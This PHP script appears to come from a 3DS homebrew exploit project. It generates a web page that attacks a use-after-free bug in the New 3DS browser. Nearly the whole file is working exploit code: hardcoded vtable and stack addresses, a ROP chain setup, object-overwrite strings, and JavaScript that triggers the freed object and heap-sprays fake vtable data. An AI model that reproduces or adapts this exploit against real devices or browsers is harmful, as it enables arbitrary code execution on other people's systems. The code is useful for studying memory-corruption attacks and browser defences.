<?php

include_once("/home/yellows8/ninupdates/weblogging.php");

$logging_dir = "/home/yellows8/ninupdates/weblogs/private";

include_once("/home/yellows8/browserhax/browserhax_cfg.php");

include_once("3dsbrowserhax_common.php");

if($browserver == 0x80)
{
	$VTABLE_JUMPADR = 0x007fb825;//0x007f1825;//The use-after-free object's "vtable" is set to an address nearby where the heap-spray data is located. This is the address which gets jumped to when the use-after-free vtable funcptr call is executed. r0 = <use-after-free object address>. This gadget does the following: 1) r0 = *r0 2) r0 = *(r0+8) 3) <return if r0==0> 4) r0 = *(r0+0x34) 5) r0 = *(r0+4) 6) calls vtable funcptr +16 from the object @ r0, with r1=1 and r2=<funcptr adr>.
}
else if($browserver == 0x81)
{
	$VTABLE_JUMPADR = 0x007fb825;
}
else
{
	echo "This browser (version) is not supported.\n";
	writeNormalLog("RESULT: 200 BROWSER(VER) NOT SUPPORTED");
	return;
}

$VTABLEPTR = 0x08d37014;
$STACKPTR_ADR = 0x08dae018;



$ROPHEAP = $VTABLEPTR;

$OBJECTDATA_OVERWRITE = "\"" . genu32_unicode($VTABLEPTR);
for($i=0; $i<7; $i++)
{
	$OBJECTDATA_OVERWRITE .= genu32_unicode($STACKPTR_ADR);//stack ptr
	$OBJECTDATA_OVERWRITE .= genu32_unicode($VTABLEPTR);//lr / vtableptr when this overwrites object+0
	$OBJECTDATA_OVERWRITE .= genu32_unicode($POPPC);
}
$OBJECTDATA_OVERWRITE .= "\"";

//$OBJECTDATA_OVERWRITE = "\"\u6004\u08b6\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\"";

generate_ropchain();

$tag = hash("sha256", $_SERVER['SCRIPT_NAME'], true);
$OBJECTDATA_PADDING = "\"" . genu32_unicode(0xF7F7F7F0);
$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
for($i=0; $i<2; $i++)
{
	for($hashi=0; $hashi<0x20; $hashi+=4)$OBJECTDATA_PADDING .= genu32_unicode(ord($tag[$hashi]) | (ord($tag[$hashi+1])<<8) | (ord($tag[$hashi+2])<<16) | (ord($tag[$hashi+1])<<24));
}
$OBJECTDATA_PADDING .= genu32_unicode(0xF4F7F7F7) . "\"";

$VTABLEDATA = "\"";
for($i=0; $i<(0x110>>2); $i++)$VTABLEDATA .= genu32_unicode(0x11223344);
$VTABLEDATA .= genu32_unicode($VTABLE_JUMPADR);
$VTABLEDATA .= "\"";

$con = "<html>
<head>
<style>
body {color:blue;background:black;} iframe {display:none;} h1 {text-align:center;}
</style>

<script>
//This haxx is only for the new3ds browser atm, based on this: http://pastebin.com/ufBCQKda
if(parent==window) {
	window.onload = function() {
	document.body.innerHTML += \"<iframe src='#' />\";      
	};
}
else
{
	var nb = 0;
	window.onload = function () {
	f = window.frameElement;
	p = f.parentNode;
	var o = document.createElement(\"object\");
	o.addEventListener('beforeload', function () {
		if (++nb == 1) {
			p.addEventListener('DOMSubtreeModified', parent.afterfree_spray, false);
		} else if (nb == 2) {
			p.removeChild(f);
		}
		}, false);
		document.body.appendChild(o);
	};
}

function heapspray(mem, size, v) {
	var a = new Array(size - 20);
	for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = v;
	var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));

	mem.push(t);
}

function afterfree_spray(e) {
	var mem = [];
	for (var j = 20; j < 430; j++)
		heapspray(mem, j, unescape($VTABLEDATA));
}
</script>
</head>
<body>
</body>
</html>
";

echo $con;

?>
